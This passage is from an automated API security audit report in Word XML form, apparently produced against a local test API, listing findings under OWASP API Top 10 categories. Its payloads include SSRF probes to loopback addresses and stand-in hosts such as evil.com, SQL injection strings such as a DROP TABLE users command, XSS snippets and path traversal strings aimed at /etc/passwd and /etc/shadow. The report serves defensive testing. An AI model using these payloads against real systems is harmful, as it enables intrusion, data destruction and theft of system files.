        <w:t xml:space="preserve">   - Response Time: 0.04174375534057617s</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:46.731629</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Unexpected server error (500)</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'url': 'http://0x7f000001/', 'target': 'http://0x7f000001/'}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"26",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7. **GET /identity/api/v2/user/dashboard**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `GET /identity/api/v2/user/dashboard`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 200</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: 0.043292999267578125s</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:46.733718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sftp://evil.com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8. **POST /identity/api/auth/v2.7/user/login-with-token**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `POST /identity/api/auth/v2.7/user/login-with-token`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: 0.04422903060913086s</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:46.734114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'http://evil.com@127.0.0.1/', 'target': 'http://evil.com@127.0.0.1/'}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9. **POST /identity/api/auth/v3/check-otp**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `POST /identity/api/auth/v3/check-otp`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 500</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: 0.04609274864196777s</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:46.735978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'http://2130706433/', 'target': 'http://2130706433/'}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"50",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10. **POST /identity/api/auth/v3/check-otp**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `POST /identity/api/auth/v3/check-otp`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 500</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: 0.04609274864196777s</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:46.735978</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Unexpected server error (500)</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'url': 'http://2130706433/', 'target': 'http://2130706433/'}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"50",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11. **POST /identity/api/auth/v2/check-otp**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `POST /identity/api/auth/v2/check-otp`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 500</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: 0.046651601791381836s</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:46.736537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'file:///etc/passwd', 'target': 'file:///etc/passwd'}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"50",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12. **POST /identity/api/auth/v2/check-otp**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `POST /identity/api/auth/v2/check-otp`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 500</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: 0.046651601791381836s</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:46.736537</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Unexpected server error (500)</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'url': 'file:///etc/passwd', 'target': 'file:///etc/passwd'}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"text/plain;charset=UTF-8",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "Content-Length": "50",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13. **POST /identity/api/auth/v3/check-otp**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `POST /identity/api/auth/v3/check-otp`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: 0.01082301139831543s</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:46.801847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http://2130706433/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"application/problem+json",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14. **POST /identity/api/auth/v2/check-otp**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `POST /identity/api/auth/v2/check-otp`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: 0.011892318725585938s</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:46.802916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file:///etc/passwd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"application/problem+json",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15. **POST /identity/api/v2/user/reset-password**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `POST /identity/api/v2/user/reset-password`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: 0.012444019317626953s</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:46.803468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http://0x7f000001/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09:49:46 GMT",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "Content-Type": "application/problem+json",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16. **POST /identity/api/auth/login**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `POST /identity/api/auth/login`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: 2.068138599395752s</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:48.758552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'tftp://evil.com', 'target': 'tftp://evil.com'}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09:49:48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17. **POST /identity/api/auth/v4.0/user/login-with-token**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `POST /identity/api/auth/v4.0/user/login-with-token`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: 2.068138599395752s</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:48.758552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'ldap://evil.com', 'target': 'ldap://evil.com'}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09:49:48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18. **POST /identity/api/auth/forget-password**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `POST /identity/api/auth/forget-password`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: 2.0686933994293213s</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:48.759107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'http://metadata.nomadproject.com/', 'target': 'http://metadata.nomadproject.com/'}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09:49:48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19. **POST /identity/api/v2/user/verify-email-token**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `POST /identity/api/v2/user/verify-email-token`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 500</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: 2.069239616394043s</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:48.759653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{'url': 'http://0.0.0.0/', 'target': 'http://0.0.0.0/'}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09:49:48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20. **POST /identity/api/v2/user/verify-email-token**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `POST /identity/api/v2/user/verify-email-token`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 500</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: 2.069239616394043s</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:48.759653</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Unexpected server error (500)</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {'url': 'http://0.0.0.0/', 'target': 'http://0.0.0.0/'}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09:49:48 GMT",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "Content-Type": "application/json",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21. **POST /identity/api/v2/user/verify-email-token**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Endpoint: `POST /identity/api/v2/user/verify-email-token`</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Status Code: 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Time: 0.0158994197845459s</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:49:48.823950</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Description: Missing security header: Strict-Transport-Security | Missing security header: Content-Security-Policy | Missing security header: Referrer-Policy | Server header exposes technology: openresty/1.25.3.1</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     http://0.0.0.0/</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response Headers:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```json</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "Server": "openresty/1.25.3.1",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "Date": "Sun, 01 Jun 2025 09:49:48 GMT",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "Content-Type": "application/problem+json",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "Transfer-Encoding": "chunked",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "Connection": "keep-alive",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "Vary": "Origin, Access-Control-Request-Method, Access-Control-Request-Headers",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "X-Content-Type-Options": "nosniff",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "X-XSS-Protection": "0",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "Cache-Control": "no-cache, no-store, max-age=0, must-revalidate",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "Pragma": "no-cache",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "Expires": "0",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "X-Frame-Options": "DENY"</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```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Harden systems according to security baselines</w:t>
        <w:br/>
        <w:t>- Disable unnecessary HTTP methods</w:t>
        <w:br/>
        <w:t>- Remove debug/test endpoints in production</w:t>
        <w:br/>
        <w:t>- Set strict CORS policies</w:t>
        <w:br/>
        <w:t>- Regularly review &amp; patch configurations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>API9:2023 – Improper Inventory Management</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Incomplete overview of endpoints/versions leads to shadow APIs and old, unpatched versions remaining online.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Findings</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>No issues found by Inventory (API09) scanner.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Recommendations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Maintain an up-to-date inventory of all endpoints</w:t>
        <w:br/>
        <w:t>- Carefully deprecate &amp; remove old versions</w:t>
        <w:br/>
        <w:t>- Document each endpoint with purpose &amp; owner</w:t>
        <w:br/>
        <w:t>- Implement clear versioning strategy</w:t>
        <w:br/>
        <w:t>- Proactively scan for undocumented APIs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>API10:2023 – Unsafe Consumption of APIs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Over-reliance on third-party data can lead to injections or unexpected behavior when the external API behaves unexpectedly.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Findings</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>## API Security Audit Report by Perry Mertens 2025 (c)</w:t>
        <w:br/>
        <w:t>Scanner: SafeConsumption</w:t>
        <w:br/>
        <w:t>Scan Time: 2025-06-01 13:53:49</w:t>
        <w:br/>
        <w:t>Base URL: http://127.0.0.1:8888</w:t>
        <w:br/>
        <w:br/>
        <w:t>### Summary</w:t>
        <w:br/>
        <w:t>| Severity | Count | Description |</w:t>
        <w:br/>
        <w:t>|----------------|-------|-------------------------------|</w:t>
        <w:br/>
        <w:t>| 🚨 Critical   | 138 | Multiple sensitive items exposed |</w:t>
        <w:br/>
        <w:t>| 🛑 High       | 80 | Single sensitive item exposed |</w:t>
        <w:br/>
        <w:t>| ⚠️ Medium     | 1280 | 200 OK on unprotected endpoint |</w:t>
        <w:br/>
        <w:t>| ℹ️ Low        | 0 | Errors or minor issues |</w:t>
        <w:br/>
        <w:br/>
        <w:t>### Detailed Findings</w:t>
        <w:br/>
        <w:br/>
        <w:t>🚨 **Critical Risk Findings**</w:t>
        <w:br/>
        <w:br/>
        <w:t>1. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:38.355273</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ' OR '1'='1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2. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:38.371240</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     '; DROP TABLE users--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3. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:38.371240</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ' OR 1=1--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4. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:38.880940</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ' AND SLEEP(5)--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5. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:38.880940</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ' UNION SELECT null--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6. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:38.885440</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     '||(SELECT version())||'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7. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:39.389466</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     " OR "" = ""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8. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:39.389999</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ' OR 'a'='a</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Response:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     {"error":"mongo: no documents in result"}</w:t>
        <w:br/>
        <w:t>{"id":"","title":"","content":"","author":{"nickname":"","email":"","vehicleid":"","profile_pic_url":"","created_at":"0001-01-01T00:00:00Z"},"comments":null,"</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```</w:t>
        <w:br/>
        <w:br/>
        <w:t>9. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:19.444938</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ' OR 1=1--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10. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:19.460299</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ' OR '1'='1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11. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:19.547577</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     '; DROP TABLE users--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12. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:20.042638</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ' UNION SELECT null--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13. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:20.061101</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ' AND SLEEP(5)--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14. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:20.159065</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     '||(SELECT version())||'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15. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:20.576009</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     " OR "" = ""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16. **Possible SQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:20.653288</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ' OR 'a'='a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17. **Possible XSS injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:21.344001</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &lt;img src=x onerror=alert(1)&gt;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18. **Possible XSS injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:21.362716</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &lt;svg/onload=alert(1)&gt;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19. **Possible XSS injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:21.448253</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &lt;script&gt;alert(1)&lt;/script&gt;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20. **Possible XSS injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:21.945062</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &lt;body onload=alert(1)&gt;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21. **Possible XSS injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:21.964952</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     "&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;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22. **Possible XSS injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:22.056589</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     '"&gt;&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gt;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23. **Possible XSS injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:22.480171</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     &lt;math&gt;&lt;mi//xlink:href="javascript:alert(1)"&gt;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24. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:23.065748</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ..\..\..\windows\win.ini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25. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:23.163978</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ../../../etc/passwd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26. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:23.179426</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     /../../../../boot.ini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27. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:23.595745</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     %2e%2e/%2e%2e/%2e%2e/etc/passwd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28. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:23.698291</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ..%2f..%2f..%2fetc%2fshadow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29. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:23.761383</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     /etc/passwd%00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30. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:24.129963</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     %252e%252e/%252e%252e/%252e%252e/etc/passwd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31. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:24.231039</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     %252e%252e%252fetc%252fpasswd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32. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:24.295108</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ..%c0%af..%c0%afetc/passwd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33. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:24.659292</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ..%e0%80%afetc/passwd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34. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:24.765306</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ..%c1%9c..%c1%9cetc/passwd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35. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:24.825852</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ..%uff0e%uff0e%u2215etc%u2215passwd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36. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:25.189360</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ..\..\..\..\..\..\windows\system32\drivers\etc\hosts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37. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:25.295234</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ..\\..\\etc\\passwd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38. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:25.368186</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ..//..//..//etc//passwd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39. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:25.721136</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     /etc/passwd%00.png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40. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:25.826493</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ..%2f..%2f%2e%2e%2fetc%2fpasswd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41. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:25.904876</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ../../etc/passwd%00.jpg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42. **Possible PATH injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:26.251021</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Payload:</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ```text</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ../../etc/passwd..;/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43. **Possible NOSQL injection**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:26.881205</w:t>
        <w:br/>
